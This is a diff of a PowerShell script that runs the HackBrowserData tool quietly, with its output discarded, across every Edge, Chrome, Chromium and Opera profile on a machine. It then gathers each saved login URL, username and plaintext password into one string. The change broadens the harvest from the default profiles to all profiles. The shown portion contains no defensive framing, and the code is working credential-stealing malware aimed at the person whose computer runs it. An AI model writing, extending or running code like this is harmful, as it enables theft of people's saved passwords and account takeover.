@@ -39,43 +39,93 @@ try {
     # Run HackBrowserData
     $exePath = "$tempDir\hack-browser-data.exe"
     if(Test-Path $exePath) {
-        # Find all browser profile folders
-        $chromeDefault = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
-        $edgeDefault = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
+        $browsers = "Debug Info:`n"
         
-        # Run for each browser found
-        if(Test-Path $chromeDefault) {
-            & $exePath -b chrome -p $chromeDefault -f json --dir $tempDir | Out-Null
+        # Search for browser data directories
+        $localAppData = $env:LOCALAPPDATA
+        $appData = $env:APPDATA
+        
+        # Check all User Data folders
+        $edgePaths = @(
+            "$localAppData\Microsoft\Edge\User Data"
+            "$localAppData\Microsoft\Edge SxS\User Data"
+        )
+        
+        $chromePaths = @(
+            "$localAppData\Google\Chrome\User Data"
+            "$localAppData\Chromium\User Data"
+        )
+        
+        $operaPaths = @(
+            "$appData\Opera Software\Opera Stable"
+            "$appData\Opera Software\Opera GX Stable"
+        )
+        
+        $browsers += "Searching for browsers...`n"
+        
+        # Find Edge profiles
+        foreach($basePath in $edgePaths) {
+            if(Test-Path $basePath) {
+                $profiles = Get-ChildItem -Path $basePath -Directory | Where-Object { $_.Name -match "^(Default|Profile \d+)$" }
+                foreach($profile in $profiles) {
+                    $browsers += "Found Edge: " + $profile.FullName + "`n"
+                    & $exePath -b edge -p $profile.FullName -f json --dir $tempDir 2>&1 | Out-Null
+                }
+            }
         }
-        if(Test-Path $edgeDefault) {
-            & $exePath -b edge -p $edgeDefault -f json --dir $tempDir | Out-Null
+        
+        # Find Chrome profiles
+        foreach($basePath in $chromePaths) {
+            if(Test-Path $basePath) {
+                $profiles = Get-ChildItem -Path $basePath -Directory | Where-Object { $_.Name -match "^(Default|Profile \d+)$" }
+                foreach($profile in $profiles) {
+                    $browsers += "Found Chrome: " + $profile.FullName + "`n"
+                    & $exePath -b chrome -p $profile.FullName -f json --dir $tempDir 2>&1 | Out-Null
+                }
+            }
         }
         
-        # Also try auto-detect as fallback
-        & $exePath -b all -f json --dir $tempDir | Out-Null
+        # Find Opera profiles
+        foreach($operaPath in $operaPaths) {
+            if(Test-Path $operaPath) {
+                $browsers += "Found Opera: " + $operaPath + "`n"
+                & $exePath -b opera -p $operaPath -f json --dir $tempDir 2>&1 | Out-Null
+            }
+        }
         
-        Start-Sleep -Seconds 3
+        Start-Sleep -Seconds 5
+        
+        # List all files created
+        $allFiles = Get-ChildItem -Path $tempDir -Filter "*.json"
+        $browsers += "JSON files found: " + $allFiles.Count + "`n"
+        foreach($f in $allFiles) {
+            $browsers += "  - " + $f.Name + " (" + $f.Length + " bytes)`n"
+        }
         
         # Read ALL password JSON files and combine
         $jsonFiles = Get-ChildItem -Path $tempDir -Filter "*password*.json" -Recurse
-        $browsers = ""
+        $passData = ""
         
         foreach($jsonFile in $jsonFiles) {
             try {
-                $data = Get-Content $jsonFile.FullName | ConvertFrom-Json
+                $content = Get-Content $jsonFile.FullName -Raw
+                $data = $content | ConvertFrom-Json
+                
                 foreach($item in $data) {
                     $url = if($item.LoginURL) { $item.LoginURL } else { "No URL" }
-                    $user = if($item.UserName) { $item.UserName } else { "" }
-                    $pass = if($item.Password) { $item.Password } else { "" }
+                    $user = if($item.UserName) { $item.UserName } else { "No User" }
+                    $pass = if($item.Password) { $item.Password } else { "No Pass" }
                     
-                    if($pass) {
-                        $browsers += "$url`nUser: $user`nPass: $pass`n`n"
-                    }
+                    $passData += "$url`nUser: $user`nPass: $pass`n`n"
                 }
             } catch {}
         }
         
-        if(-not $browsers) { $browsers = "No saved browser passwords found" }
+        if($passData) {
+            $browsers = $passData
+        } else {
+            $browsers = "Failed to extract any data"
+        }
     } else {
         $browsers = "Failed to extract HackBrowserData"
     }
